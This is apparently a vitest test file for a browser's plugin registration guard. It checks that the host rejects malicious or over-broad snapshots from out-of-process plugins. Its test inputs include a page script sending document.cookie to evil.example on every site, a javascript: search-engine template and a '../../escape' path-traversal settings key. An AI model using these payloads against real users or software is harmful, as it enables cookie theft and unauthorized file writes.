import { describe, expect, it, vi } from "vitest";
import type { PluginRegistrationSnapshot } from "../../../src/services/plugins/plugin-child-runtime.js";
import {
  adoptPluginRegistrationSnapshot,
  PluginRegistrationRefusedError,
} from "../../../src/services/plugins/plugin-registration-guard.js";

/**
 * What the host will believe about a plugin process's registrations.
 *
 * A plugin's factory runs over there, so its registrations arrive as one
 * bootstrap reply rather than as calls — and the reply used to be adopted with
 * a cast. The gate on `registerPageScript` lives in `plugin-api.ts`, which for
 * an out-of-process plugin is a copy running inside the process it was meant to
 * bind: a plugin that writes to the channel itself never reaches it. These are
 * the host asking the same questions of the answer.
 */

/** A plugin that registered nothing: every field present, all of them empty. */
function emptySnapshot(): PluginRegistrationSnapshot {
  return {
    httpRoutes: [],
    rpcMethods: [],
    backgroundServices: [],
    schedules: [],
    cli: null,
    agentTools: [],
    hasAgentConfiguration: false,
    hasInstructionProvider: false,
    mentionProviders: [],
    omniboxProviders: [],
    contextMenuItems: [],
    findActions: [],
    tabActions: [],
    siteInfoProviders: [],
    toolbarItems: [],
    newTabWidgets: [],
    commands: [],
    downloadHandlerCount: 0,
    historyFilterCount: 0,
    authProviderCount: 0,
    pdfTextProviderCount: 0,
    externalLinkHandlerCount: 0,
    keybindings: [],
    searchEngines: [],
    pageStyles: [],
    pageScripts: [],
    threadEvents: [],
    settingsDescriptors: {},
    hasSettingsListeners: false,
  };
}

function adopt(args: {
  reply: unknown;
  permissions?: string[];
  sites?: string[];
  warn?: (message: string) => void;
}): PluginRegistrationSnapshot {
  return adoptPluginRegistrationSnapshot({
    pluginId: "boundary",
    permissions: args.permissions as never,
    sites: args.sites,
    reply: args.reply,
    ...(args.warn === undefined ? {} : { logger: { warn: args.warn } }),
  });
}

describe("adopting a plugin's registration snapshot", () => {
  it("keeps what the plugin declared", () => {
    const reply = {
      ...emptySnapshot(),
      pageScripts: [
        { id: "reader", matches: ["https://example.com/*"], code: "void 0;" },
      ],
      contextMenuItems: [
        {
          id: "shout",
          title: "Shout",
          when: { image: false, link: false, page: false, selection: true },
        },
      ],
    };

    const snapshot = adopt({
      reply,
      permissions: ["pageScript.register", "contextMenu.register"],
      sites: ["https://example.com/*"],
    });

    expect(snapshot.pageScripts).toEqual(reply.pageScripts);
    expect(snapshot.contextMenuItems).toEqual(reply.contextMenuItems);
  });

  // The repro from issue #20: a manifest declaring nothing, and a snapshot that
  // registers a page script on every site the user visits.
  it("refuses a page script from a plugin that declared no permission", () => {
    const warn = vi.fn();

    expect(() =>
      adopt({
        reply: {
          ...emptySnapshot(),
          pageScripts: [
            {
              id: "x",
              matches: ["*://*/*"],
              code: "fetch('https://evil.example?c='+document.cookie)",
            },
          ],
        },
        warn,
      }),
    ).toThrow(PluginRegistrationRefusedError);

    // Not silent: reaching this means the host and the plugin's own copy of the
    // gate disagree, and nothing else in the system would say so.
    expect(warn).toHaveBeenCalledWith(
      expect.stringContaining("pageScript.register"),
    );
  });

  // The other half, and the one the permission alone does not answer: the
  // plugin holds `pageScript.register` for the sites it declared, and this
  // snapshot names one it did not.
  it("refuses a page script matching a site outside patcher.sites", () => {
    expect(() =>
      adopt({
        reply: {
          ...emptySnapshot(),
          pageScripts: [{ id: "x", matches: ["*://*/*"], code: "void 0;" }],
        },
        permissions: ["pageScript.register"],
        sites: ["https://example.com/*"],
      }),
    ).toThrow(/does not declare in "patcher.sites".*https:\/\/example\.com/s);
  });

  it("refuses a page style the same way", () => {
    expect(() =>
      adopt({
        reply: {
          ...emptySnapshot(),
          pageStyles: [
            { id: "x", matches: ["https://bank.example/*"], css: "body{}" },
          ],
        },
        permissions: ["pageStyle.register"],
        sites: ["https://example.com/*"],
      }),
    ).toThrow(/page style "x" matches/);
  });

  // An anonymous registration's *index is its identity*, so an inflated count
  // claims callbacks the plugin never registered — and each one is a call the
  // host will make into it.
  it("refuses an anonymous handler count the plugin cannot have", () => {
    expect(() =>
      adopt({ reply: { ...emptySnapshot(), authProviderCount: 1 } }),
    ).toThrow(/auth\.provide/);
    expect(() =>
      adopt({
        reply: { ...emptySnapshot(), downloadHandlerCount: 2 ** 30 },
        permissions: ["downloads.handle"],
      }),
    ).toThrow(PluginRegistrationRefusedError);
  });

  it("refuses a reply that is not a snapshot at all", () => {
    expect(() => adopt({ reply: null })).toThrow(/not a registration snapshot/);
    expect(() =>
      adopt({
        reply: { ...emptySnapshot(), pageScripts: [{ id: 7, matches: "all" }] },
        permissions: ["pageScript.register"],
      }),
    ).toThrow(/not a registration snapshot/);
  });

  // The omnibox navigates to a chosen engine's template, so what a plugin
  // reports there is a url the app will open.
  it("refuses a search engine template the browser must not navigate to", () => {
    expect(() =>
      adopt({
        reply: {
          ...emptySnapshot(),
          searchEngines: [
            { id: "evil", name: "Evil", urlTemplate: "javascript:alert(1)%s" },
          ],
        },
        permissions: ["searchEngine.register"],
      }),
    ).toThrow(/not a registration snapshot/);
  });

  // A secret's key becomes a file this process writes, and the child's own
  // check on that is a pattern the host never re-applied.
  it("refuses a settings key that is not a tame file name", () => {
    expect(() =>
      adopt({
        reply: {
          ...emptySnapshot(),
          settingsDescriptors: {
            "../../escape": { type: "string", label: "Token", secret: true },
          },
        },
      }),
    ).toThrow(/not a registration snapshot/);
  });

  // The table follows plugin-api.ts rather than leading it: a registration the
  // child charges nothing for must not be refused here, or the host would
  // refuse a plugin the install told the user nothing about.
  it("leaves registrations no permission gates alone", () => {
    const reply = {
      ...emptySnapshot(),
      mentionProviders: [{ id: "notes", label: "Notes", triggers: ["@"] }],
      rpcMethods: ["ping"],
      httpRoutes: [{ method: "GET", path: "/hook", auth: "none" }],
    };

    expect(adopt({ reply }).mentionProviders).toEqual(reply.mentionProviders);
  });
});
